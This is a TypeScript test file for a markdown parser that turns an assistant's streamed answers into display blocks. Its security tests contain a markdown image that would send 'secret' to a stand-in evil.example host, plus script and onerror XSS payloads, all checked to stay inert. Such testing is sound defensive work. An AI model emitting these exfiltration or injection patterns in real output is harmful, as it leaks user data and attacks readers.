// Auto's answer as blocks (OT-C8): every block and inline kind marked's GFM lexer gives, nested
// lists, a fenced block with its language, a table, links, HTML kept literal, and the promises the
// thread relies on while a reply streams: partial or malformed markdown never throws and never
// loses words.

import { afterEach, describe, expect, it, vi } from 'vitest';

import {
  MAX_MARKDOWN_CHARS,
  MAX_NESTING,
  markdownBlocks,
  type Block,
  type ListBlock,
  type ParagraphBlock,
  type TableBlock,
} from '../blocks';
import { decodeEntities, spansText, type InlineMark, type Span } from '../inline';

const text = (words: string, marks: InlineMark[] = [], href: string | null = null): Span => ({
  kind: 'text',
  text: words,
  marks,
  href,
});
const BREAK: Span = { kind: 'break' };
const para = (...spans: Span[]): ParagraphBlock => ({ kind: 'paragraph', spans });

/** A run's words, and a link's address with them (it is held, only not shown as words). */
const spanWords = (spans: readonly Span[]) =>
  spans
    .map((span) =>
      span.kind === 'text' && span.href ? `${span.text} ${span.href}` : spansText([span]),
    )
    .join('');

/** Every word the blocks hold, in order (to prove nothing vanished). */
function wordsOf(blocks: readonly Block[]): string {
  return blocks
    .map((block) => {
      switch (block.kind) {
        case 'paragraph':
        case 'heading':
          return spanWords(block.spans);
        case 'list':
          return block.items.map((item) => wordsOf(item.blocks)).join(' ');
        case 'quote':
          return wordsOf(block.blocks);
        case 'code':
          return block.text;
        case 'table':
          return [block.header, ...block.rows].flat().map(spanWords).join(' ');
        case 'rule':
          return '';
      }
    })
    .join(' ');
}

const only = <T extends Block>(markdown: string): T => {
  const blocks = markdownBlocks(markdown);
  expect(blocks).toHaveLength(1);
  return blocks[0] as T;
};

describe('blocks', () => {
  it('reads a paragraph, keeping a single newline as a line break', () => {
    expect(markdownBlocks('Hello Gerard.\nTwo things today.')).toEqual([
      para(text('Hello Gerard.'), BREAK, text('Two things today.')),
    ]);
  });

  it('splits paragraphs on blank lines', () => {
    expect(markdownBlocks('One.\n\n\nTwo.')).toEqual([para(text('One.')), para(text('Two.'))]);
  });

  it('reads headings at their level, ATX and setext', () => {
    expect(markdownBlocks('# Plan\n### Steps\n###### Small\n\nTitle\n===')).toEqual([
      { kind: 'heading', level: 1, spans: [text('Plan')] },
      { kind: 'heading', level: 3, spans: [text('Steps')] },
      { kind: 'heading', level: 6, spans: [text('Small')] },
      { kind: 'heading', level: 1, spans: [text('Title')] },
    ]);
  });

  it('reads a bulleted list and a numbered one from its start', () => {
    expect(markdownBlocks('- one\n- two')).toEqual([
      {
        kind: 'list',
        ordered: false,
        start: 1,
        items: [{ blocks: [para(text('one'))] }, { blocks: [para(text('two'))] }],
      },
    ]);
    const numbered = only<ListBlock>('3. three\n4. four');
    expect(numbered).toMatchObject({ ordered: true, start: 3 });
    expect(numbered.items.map((item) => wordsOf(item.blocks))).toEqual(['three', 'four']);
  });

  it('nests a list inside an item, with the item’s own paragraphs', () => {
    const list = only<ListBlock>('1. one\n2. two\n   - nested\n   - more\n\n   after\n3. three');
    expect(list.items).toHaveLength(3);
    const [first, ...rest] = list.items[1].blocks;
    expect(first).toEqual(para(text('two')));
    expect(rest).toEqual([
      {
        kind: 'list',
        ordered: false,
        start: 1,
        items: [{ blocks: [para(text('nested'))] }, { blocks: [para(text('more'))] }],
      },
      para(text('after')),
    ]);
  });

  it('reads a task item as plain words: no box, nothing lost', () => {
    const list = only<ListBlock>('- [ ] write the brief\n- [x] **send** it');
    expect(list.items.map((item) => item.blocks)).toEqual([
      [para(text('write the brief'))],
      [para(text('send', ['strong']), text(' it'))],
    ]);
  });

  it('reads a fenced code block with its language, blank lines and all', () => {
    expect(markdownBlocks('```ts\nconst a = 1;\n\nconst b = 2;\n```')).toEqual([
      { kind: 'code', lang: 'ts', text: 'const a = 1;\n\nconst b = 2;' },
    ]);
    expect(only('```python title="x.py"\nprint(1)\n```')).toEqual({
      kind: 'code',
      lang: 'python',
      text: 'print(1)',
    });
    expect(only('    indented()')).toEqual({ kind: 'code', lang: null, text: 'indented()' });
  });

  it('keeps a code block’s characters exactly: no entity decoding, no HTML', () => {
    expect(only('```\n<b>&amp;</b>\n```')).toEqual({
      kind: 'code',
      lang: null,
      text: '<b>&amp;</b>',
    });
  });

  it('reads a GFM table: header, rows, alignment, inline marks in cells', () => {
    const table = only<TableBlock>(
      '| Doc | Owner | Due |\n|:---|:-:|--:|\n' +
        '| `plan.md` | **Gerard** | Fri |\n| Brief | Dave | Mon |',
    );
    expect(table.align).toEqual(['left', 'center', 'right']);
    expect(table.header).toEqual([[text('Doc')], [text('Owner')], [text('Due')]]);
    expect(table.rows).toEqual([
      [[text('plan.md', ['code'])], [text('Gerard', ['strong'])], [text('Fri')]],
      [[text('Brief')], [text('Dave')], [text('Mon')]],
    ]);
  });

  it('pads a short row and cuts a long one to the header’s width', () => {
    const table = only<TableBlock>('| A | B | C |\n|---|---|---|\n| 1 |\n| 1 | 2 | 3 | 4 |');
    expect(table.rows.map((row) => row.map(spansText))).toEqual([
      ['1', '', ''],
      ['1', '2', '3'],
    ]);
  });

  it('reads a table straight after a line of words', () => {
    expect(markdownBlocks('Here:\n| a | b |\n|---|---|\n| 1 | 2 |').map((b) => b.kind)).toEqual([
      'paragraph',
      'table',
    ]);
  });

  it('reads a quote, with its own blocks inside', () => {
    expect(markdownBlocks('> quote **this**\n> - and a list')).toEqual([
      {
        kind: 'quote',
        blocks: [
          para(text('quote '), text('this', ['strong'])),
          {
            kind: 'list',
            ordered: false,
            start: 1,
            items: [{ blocks: [para(text('and a list'))] }],
          },
        ],
      },
    ]);
  });

  it('reads a rule', () => {
    expect(markdownBlocks('Above\n\n---\n\nBelow')).toEqual([
      para(text('Above')),
      { kind: 'rule' },
      para(text('Below')),
    ]);
  });

  it('drops a link reference definition but keeps the link it names', () => {
    expect(markdownBlocks('[ref]: https://example.com/a\n\nSee [the doc][ref].')).toEqual([
      para(text('See '), text('the doc', [], 'https://example.com/a'), text('.')),
    ]);
  });
});

describe('inline spans', () => {
  it('reads strong, em, del and code spans', () => {
    expect(markdownBlocks('**bold** _em_ ~~gone~~ `code`')).toEqual([
      para(
        text('bold', ['strong']),
        text(' '),
        text('em', ['em']),
        text(' '),
        text('gone', ['del']),
        text(' '),
        text('code', ['code']),
      ),
    ]);
  });

  it('carries every mark around a run, in one order, each once', () => {
    expect(markdownBlocks('***both*** and **bold _inner_ x**')).toEqual([
      para(
        text('both', ['strong', 'em']),
        text(' and '),
        text('bold ', ['strong']),
        text('inner', ['strong', 'em']),
        text(' x', ['strong']),
      ),
    ]);
  });

  it('reads a link’s address and words, marks inside it included', () => {
    expect(markdownBlocks('[**Open** the `board`](/command-center?tab=board)')).toEqual([
      para(
        text('Open', ['strong'], '/command-center?tab=board'),
        text(' the ', [], '/command-center?tab=board'),
        text('board', ['code'], '/command-center?tab=board'),
      ),
    ]);
  });

  it('autolinks a bare web address and an email (GFM)', () => {
    expect(markdownBlocks('See https://automatos.app or mail hi@automatos.app')).toEqual([
      para(
        text('See '),
        text('https://automatos.app', [], 'https://automatos.app'),
        text(' or mail '),
        text('hi@automatos.app', [], 'mailto:hi@automatos.app'),
      ),
    ]);
  });

  it('shows an image as its alt text, never as something to fetch', () => {
    expect(markdownBlocks('![the chart](https://evil.example/leak?q=secret)')).toEqual([
      para(text('the chart')),
    ]);
  });

  it('reads a hard line break', () => {
    expect(markdownBlocks('a  \nb\\\nc')).toEqual([
      para(text('a'), BREAK, text('b'), BREAK, text('c')),
    ]);
  });

  it('keeps escaped characters as the characters', () => {
    expect(markdownBlocks('\\*not bold\\* and 2 \\< 3')).toEqual([
      para(text('*not bold* and 2 < 3')),
    ]);
  });

  it('decodes the character references a model writes, in words only', () => {
    expect(markdownBlocks('AT&amp;T &lt;tag&gt; &quot;q&quot; &#8364;5 &#x41; &copy;')).toEqual([
      para(text('AT&T <tag> "q" €5 A &copy;')),
    ]);
    expect(markdownBlocks('`&amp;`')).toEqual([para(text('&amp;', ['code']))]);
    // no code point zero, no lone surrogate, nothing past U+10FFFF: left as written
    expect(decodeEntities('&#0; &#xD800; &#1114112;')).toBe('&#0; &#xD800; &#1114112;');
  });
});

describe('HTML is shown as written, never interpreted', () => {
  it('keeps inline tags as literal text', () => {
    expect(markdownBlocks('hello <b>bold</b> <img src=x onerror=alert(1)>')).toEqual([
      para(text('hello <b>bold</b> <img src=x onerror=alert(1)>')),
    ]);
  });

  it('keeps an HTML block as one literal paragraph', () => {
    expect(markdownBlocks('<script>alert(1)</script>\n\nafter')).toEqual([
      para(text('<script>alert(1)</script>')),
      para(text('after')),
    ]);
  });
});

describe('streaming and malformed input', () => {
  it('shows an unclosed ** as written, never dropping the words', () => {
    expect(markdownBlocks('**Bo')).toEqual([para(text('**Bo'))]);
    expect(markdownBlocks('Two docs: **pl')).toEqual([para(text('Two docs: **pl'))]);
  });

  it('shows a half-written table as words until its delimiter row is there', () => {
    expect(markdownBlocks('| Doc | Owner |\n|---')).toEqual([
      para(text('| Doc | Owner |'), BREAK, text('|---')),
    ]);
    const growing = only<TableBlock>('| Doc | Owner |\n|---|---|\n| Plan | Ger');
    expect(growing.rows.map((row) => row.map(spansText))).toEqual([['Plan', 'Ger']]);
  });

  it('reads an unclosed fence as code so far', () => {
    expect(markdownBlocks('Run this:\n\n```sh\nnpm ci')).toEqual([
      para(text('Run this:')),
      { kind: 'code', lang: 'sh', text: 'npm ci' },
    ]);
  });

  it('never throws and keeps the words for every prefix of a mixed answer', () => {
    const answer = [
      '## Plan\n\n**Two** docs need you:\n\n',
      '| Doc | Owner |\n|---|:-:|\n| `plan.md` | Gerard |\n\n',
      '1. Read [it](/deliverables?deliverable=7)\n   - then ~~wait~~ *reply*\n\n',
      '> done\n\n```js\nx()\n```',
    ].join('');
    for (let end = 0; end <= answer.length; end += 1) {
      const prefix = answer.slice(0, end);
      const blocks = markdownBlocks(prefix);
      const lastWord = prefix.match(/[A-Za-z]{3,}/g)?.at(-1);
      if (lastWord) expect(wordsOf(blocks), prefix).toContain(lastWord);
    }
  });

  it('survives pathological input', () => {
    for (const input of [
      '*'.repeat(500),
      '>'.repeat(200) + ' deep',
      '- '.repeat(200) + 'deep',
      '[a]('.repeat(200),
      '|'.repeat(300),
      '`'.repeat(301),
      '\u0000\u0001 control',
      '\r\nWindows\r\nlines',
    ]) {
      expect(() => markdownBlocks(input), input.slice(0, 20)).not.toThrow();
    }
    expect(wordsOf(markdownBlocks('>'.repeat(200) + ' deep'))).toContain('deep');
    expect(wordsOf(markdownBlocks('- '.repeat(200) + 'deep'))).toContain('deep');
  });

  it(`stops nesting at ${MAX_NESTING} levels: deeper reads as raw text`, () => {
    const deep = markdownBlocks('>'.repeat(MAX_NESTING + 3) + ' bottom');
    let block: Block | undefined = deep[0];
    let depth = 0;
    while (block?.kind === 'quote') {
      block = block.blocks[0];
      depth += 1;
    }
    expect(depth).toBe(MAX_NESTING);
    expect(block?.kind).toBe('paragraph');
    expect(wordsOf(deep)).toContain('bottom');
  });

  it('reads an answer past the size cap as plain paragraphs, unlexed', () => {
    const long = `**${'a'.repeat(MAX_MARKDOWN_CHARS)}**\n\nlast`;
    expect(markdownBlocks(long)).toEqual([
      para(text(`**${'a'.repeat(MAX_MARKDOWN_CHARS)}**`)),
      para(text('last')),
    ]);
  });

  it('reads nothing as nothing', () => {
    expect(markdownBlocks('')).toEqual([]);
    expect(markdownBlocks('  \n\n \t')).toEqual([]);
    expect(markdownBlocks('[ref]: https://example.com')).toEqual([]);
    expect(markdownBlocks(undefined as unknown as string)).toEqual([]);
  });
});

describe('a lexer failure', () => {
  afterEach(() => {
    vi.doUnmock('marked');
    vi.resetModules();
  });

  it('is one paragraph of the raw text, never a throw', async () => {
    vi.resetModules();
    vi.doMock('marked', async (importOriginal) => {
      const real = await importOriginal<typeof import('marked')>();
      class BrokenLexer extends real.Lexer {
        static lex(): never {
          throw new Error('Infinite loop on byte: 42');
        }
      }
      return { ...real, Lexer: BrokenLexer };
    });
    const fresh = await import('../blocks');
    expect(fresh.markdownBlocks('  **Two** docs\n\n| a |  ')).toEqual([
      para(text('**Two** docs\n\n| a |')),
    ]);
  });
});
